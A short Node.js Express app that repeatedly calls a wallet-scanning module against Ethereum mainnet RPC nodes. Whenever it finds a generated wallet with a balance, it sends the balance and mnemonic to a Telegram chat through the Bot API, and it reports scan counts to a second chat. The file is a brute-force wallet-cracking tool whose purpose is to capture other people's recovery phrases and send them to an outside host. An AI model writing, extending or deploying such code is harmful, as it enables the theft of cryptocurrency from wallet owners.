const { Web3Factory } = require('./modules/web3Factory')
const env = require('./modules/env')
const express = require('express')
const app = express()
const port = process.env.PORT || 4000

const NOTI_RUNNING = '-1002158985462'
const NOTI_FOUND = '-1002151658507'

const RPC_NODES = env.ETHEREUM_RPC_NODE ? env.ETHEREUM_RPC_NODE.split(';') : []
const INSTANCES = RPC_NODES.map(
  rpc => new Web3Factory(`https://eth-mainnet.g.alchemy.com/v2/${rpc}`, 'ethereum')
)

let count = 1

const sendMessage = async (message, chatId) => {
  fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
}
const sendNotification = () => {
  const text =
    'Server: ' +
    env.SERVER_NAME +
    '--- Instances: ' +
    INSTANCES.length +
    '--- Scanned: ' +
    count * INSTANCES.length

  console.log(text)
  sendMessage(text, NOTI_RUNNING)
}

async function scan(ethereumInstance) {
  try {
    const ethereumScanResult = await ethereumInstance.scanNetwork()
    if (ethereumScanResult.balance) {
      const text =
        'Balance: ' + ethereumScanResult.balance + ' - Keys: ' + ethereumScanResult.mnemonic
      sendMessage(text, NOTI_FOUND)
    }

    if (count % 10000 === 0) {
      sendNotification()
    }
    count++
  } catch (error) {
    console.log('error', error)
  }
}
const INTERVAL = 20

async function main() {
  setInterval(async () => {
    INSTANCES.map(ins => scan(ins))
  }, INTERVAL)
}

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.listen(port, () => {
  main()
  console.log(`SC APP listening on port ${port}, INSTANCES: ${INSTANCES.length}`)
})
